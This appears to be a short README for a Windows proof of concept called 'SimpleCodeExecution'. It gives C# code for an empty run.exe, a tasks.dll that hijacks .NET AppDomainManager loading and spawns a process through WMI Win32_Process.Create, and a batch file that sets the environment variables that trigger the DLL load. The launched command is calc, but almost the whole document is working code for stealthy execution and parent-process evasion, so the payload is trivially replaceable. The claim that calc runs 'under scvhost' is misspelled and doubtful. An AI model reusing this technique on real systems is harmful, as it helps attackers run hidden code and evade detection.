# SimpleCodeExecution
Execute tasks.dll with minimum of code, run.exe, tasks.dll and run.bat in same folder, calc is started under scvhost.


run.exe:

```
using System;

public class MyProgram
{
    public static void Main(string[] args)
    {
    }
}

```

tasks.dll:

```
using System;
using System.Management;

public sealed class WMI : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        WMIexec.Run("calc");
        return;
    }

}

public class WMIexec
{
	public static void Run(string cmd)
	{
			var cmdToRun = new[] { cmd };
			var connection = new ConnectionOptions();
			connection.Impersonation = ImpersonationLevel.Impersonate;
			connection.EnablePrivileges = true;
			var wmiScope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", "localhost"), connection);
			var wmiProcess = new ManagementClass(wmiScope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
			object result = wmiProcess.InvokeMethod("Create", cmdToRun);
	}
}

```

run.bat:

```
set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=WMI
set COMPLUS_Version=v4.0.30319
run.exe

```
